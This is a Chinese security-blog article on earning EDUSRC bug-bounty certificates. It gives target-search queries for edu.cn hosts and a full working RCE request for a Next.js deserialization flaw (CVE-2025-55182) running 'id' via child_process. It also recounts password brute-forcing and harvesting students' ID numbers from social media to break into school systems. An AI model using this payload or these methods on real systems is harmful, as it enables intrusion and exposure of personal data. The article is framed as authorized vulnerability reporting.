---
title: 小白如何获取EDUSRC证书
url: https://mp.weixin.qq.com/s/0rVtHIRzSiSzYWy1On_f_g
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:41:43.803199
---

# 小白如何获取EDUSRC证书

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthxrXBE3ecgqaYibeKBOBbuqCEDFgZxygtniavXmP0Ps6PQkAZzibInlV3w/0?wx_fmt=jpeg)

# 小白如何获取EDUSRC证书

原创

神农Sec
神农Sec

神农Sec

![]()

在小说阅读器中沉浸阅读

扫码加圈子

获内部资料

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic)

#

专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。

#

01

0x1 小白如何获取EDUSRC证书

## 一、 EDUSRC介绍

通过上面的介绍，给师傅们分享了欧盟名人堂、CVE漏洞编号获取、包括CNVD漏洞挖掘获取证书相关的。这里再打算给师傅们分享下EDUSRC的，虽然说之前出了几篇EDUSRC的，但是这里干脆直接出一个SRC大全，把这些SRC系列的都给师傅们分享一波。

首先对于edusrc的资产来讲，edu.cn结尾的域名，基本上都是学校的资产都是可以提交EDUSRC，对于平台的单位，可以看这个，网站：https://src.sjtu.edu.cn/rank/firm/

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthKGoRhFuekBoVqSWo9icwzv1Vjs18mibnafarMVEC2mzNPCwfFXNP4leQ/640?wx_fmt=png&from=appmsg "null")

然后就是人社部门相关的，这里给师傅们简单介绍下。

* 人社部门概述
  人社部门是指人力资源与社会保障部、人力资源与社会保障厅、人力资源与社会保障局等机构，通常简称为人社部、人社厅、人社局。
* 人社部门管理的学校
  人社部门管理的学校通常为技工学校、技师学院。判断某所学校是否属于人社部门管理，可以通过搜索引擎查询“学校名称 隶属于”来获取相关参考信息，如搜索结果中显示某学校隶属于人社部门，即可确认其为收录范围内的学校。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthicAicF1RYzlecCiamD8ZIJRfb5s3MFZyn7I9PDPiaCfCYicbK4rIGEkQeEg/640?wx_fmt=png&from=appmsg "null")

这里再给师傅们分享一些人社相关搜索关键字，主要用于测试微信小程序的漏洞：

```
就业训练
劳动就业服务管理中心
高级技工学校
信息采集
人才培养
劳动保障
社会保险
劳动维权
职业介绍
公共就业
创业
人事
仲裁
社会保险
劳动就业服务局
社会保障中心
城乡居民养老保险中心
人才交流开发中心
劳动监察大队
职业技能鉴定中心
机关服务中心
创业担保贷款基金管理中心
创业指导中心
乡镇劳动就业社会保障服务中心
信息和考试中心
```

还有一个就是中国科学院，这个中国科学院单位也是今年新加入的单位，很多小伙伴师傅们还不知道，下面就给师傅们简单介绍下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthPyO7GZjnGDYr1ictRON9sBwIfeD0h2ia4U1nibxlKOjha2kqjvSA6rLwA/640?wx_fmt=png&from=appmsg "null")

主要是以ac.cn和cas.cn两个主域名为主，搜索语法：

```
site:cas.cn OR ac.cn
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthY5WpZLQ573r7Ao1ut8icicVqfolfDJmkic5bibHl3VSnW1rPTjFUjpoAsQ/640?wx_fmt=png&from=appmsg "null")

## 二、 核弹级别CVE-2025-55182刷证书站

网传消息，Next.js 在 App Router 模式下存在**无条件远程代码执行漏洞（CVE-2025-55182）**，攻击者无需认证即可实现任意代码执行。该漏洞影响范围极广，**CVSS 3.1评分高达10.0分**，请相关企业和开发者立即排查修复！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthqdmdlHDVeGq2jWvs4Dt9lP1b7e6ias4zEubBckfe4oyr21OsvhB6AGQ/640?wx_fmt=png&from=appmsg "null")

* **漏洞编号**

  ：CVE-2025-55182
* **漏洞类型**

  ：远程代码执行（RCE）
* **利用难度**

  ：极低，无需凭证
* **影响范围**

  ：使用 React Server Components + App Router 的 Next.js 应用
* **核心原理：**

  攻击者通过精心构造 React Flight 协议数据块，在反序列化早期阶段污染对象原型，劫持 Promise 解析过程，最终实现任意代码执行。该利用链不依赖应用导出任何危险函数，在 Next.js 服务端可无条件触发。
* **影响的版本如下：**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthWZJp9CrlDT7oOxSpO6KpNhLm0niaiaZJxnvB24ARic8CCrpSgkaGericmA/640?wx_fmt=png&from=appmsg "null")

这里给师傅们分享几个拿这个核弹级别的CVE漏洞挖掘EDUSRC漏洞的语法：

```
app="Next.js" && body="/_next/static/chunks/app/" && host="edu.cn"
body="react.production.min.js" || body="React.createElement(" || app="React.js" || app="Dify" && host="edu.cn"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthIfLYjhpdfickuib5F44msE1FP741UAFbXxzicmv8WGC4ulia1fKg6UneZA/640?wx_fmt=png&from=appmsg "null")

漏洞复现有回显的POC：

```
POST /或者/apps HTTP/1.1
Host: xxxxx
Next-Action: x
X-Nextjs-Request-Id: ygdkgols
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: 0OySzliul7lMdEUPchXuS
Content-Length: 691

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

可以成功进行RCE利用。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltth0BnbTIKJEbfACvMPYcDRHpPh2R878QU22icKAc8JVVtAAaVIRibyfQrA/640?wx_fmt=png&from=appmsg "null")

后面也是成功提交了一个，且已经通过了没有重复，这个CVE漏洞一出来，很多人去EDU平台刷，基本上很多都重复了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthBRmia3Om9mVAMQvVC8elE6ic2Q0sHzWrXkZWdXY5BanutqZeu2qx4PtQ/640?wx_fmt=png&from=appmsg "null")

然后就可以兑换对应的EDUSRC漏洞证书了，也是对自己实力的一种认可了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthurWdzjhsI8xBeI20hMTGJEL9VLoGlLcjjZB7hu6PzM65TJaX2gib62g/640?wx_fmt=png&from=appmsg "null")

## 三、 其它证书站实战案例

### 1、某访客系统泄露大量身份证信息

这里打一个EDU站点，我比较喜欢看看微信小程序，这里首先看的是他们学校的访客系统，因为一般访客系统允许使用手机号登陆，或者进行用户注册的操作，这样的测试范围要广些。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltth9ibia3W7eiauDpibewh59O5qP62YvWXcrAwib7qsR5apZiaPjict0ZmqxTDdA/640?wx_fmt=png&from=appmsg "null")

我这里开始是直接从访客进去的，但是里面没有测出什么漏洞，就是出了一个存储型的XSS漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthFuMT8W28M7ogLD9PoGanWK5iaxhd4PUsugzSMfFBSN0GH1Syjm1CpHA/640?wx_fmt=png&from=appmsg "null")

于是我这里尝试使用教职工进行登陆，但是没有密码，于是我就利用网上的社工账号密码爆破方法，收集改学校的邮箱开头和学校拼音，首字母等，账号爆破常见的比如：admin、test等。

这里师傅们要是没有适合的工具，推荐使用无影的密码生成模块的社工模式。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthYic3X0Tmuyvh7A28iaUjKLPsXsCzg2LA4BICoaomHOpgvWicH5Eic6e53A/640?wx_fmt=png&from=appmsg "null")

后面直接成功爆破出账号是admin，密码是zjcjdx123456，类似密码就是大学的简称。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltth8SoYCzGEZibqAEibvZcESkxI5BiarBibPKG6S2Jh69gxcFcm0dJEX3NOEA/640?wx_fmt=png&from=appmsg "null")

管理员的权限直接可以看到里面访客人员申请的姓名、身份证敏感信息。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthAGo5icS7VicDwgJjeubZUfFF8NdA8ZZcewR91X0ib3ArVG4I4pylt6TAQ/640?wx_fmt=png&from=appmsg "null")

### 2、通过泄露信息进统一身份认证管理

首先我这里使用社工方法，通过对xxx⼤学进⾏帐号密码信息收集，在⼩红书、抖⾳、Google语法收集到了该学校⼀些⾝份证、电话号码、学号、姓名等敏感信息。

下面是使用小红书找到的图片，但是没有找到sfz。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthRXpr4D6vv9XkAFSvGgykaiaI0RKftrkFGQE7HUicIW10uYtHHGYruSSA/640?wx_fmt=png&from=appmsg "null")

后面还是在抖音上面找到的xm、xh、sfz信息。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthdE9TZtP28kpsqPIGRguBECHwCHzXwhR8K2aWIhWQygFo3Kj8jHuQKw/640?wx_fmt=png&from=appmsg "null")

通过上面泄露的信息成功登陆系统后台。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthfDzE5C1dPGvdwHt9prULx0YOP7ufhREWgibdNRUjxN6Trmq5k2QicOHQ/640?wx_fmt=png&from=appmsg "null")

这里发现查询功能接口，存在id遍历，改功能点可以查看学校很多学⽣的个⼈信息，姓名、⼿机号、以及id序列号（后⾯可以进⾏越权遍历信息）。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltth6iaEmBXBMibsFAszw6fQyUQHUAfwQ7I3f9Ymu5Gq6Krc8DghaiclqPu1A/640?wx_fmt=png&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthAdCA5icO1FaXM9HdoMbTcTQJIJ8x0ib7jOS02r0czL76W4sSpMAkkKYg/640?wx_fmt=png&from=appmsg "null")

然后通过里面别的admin接口，可以越权访问一些学校的敏感文件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthSeA74icpy8iaovBACRSeKZSDzt5CRJAWiajQ8dXbjjpQQ09KAakyNQrbA/640?wx_fmt=png&from=appmsg "null")

可以越权访问一些学校学生和老师的证书相关。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthykqVDU5hBSZaeic7p2zlK6T8jEjvZKJwODic5HEUyicZD6vSX3UOovCHw/640?wx_fmt=png&from=appmsg "null")

最后像这样的都是可以直接打包提交给EDUSRC平台了，后面那边会进行修复的，且不建议下载到自己本地敏感文件，要做合规的白帽子，请勿做一些非法操作。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthbMibUAicAA9eTJoYjqE72MX3WVNFyyJWK3Z1Jpblz6Tv0Q8sHAXtjl7w/640?wx_fmt=png&from=appmsg "null")

02

0x2 内部小圈子详情介绍

我们是***神农安全***，***点赞 + 在看*** 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。

![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUr...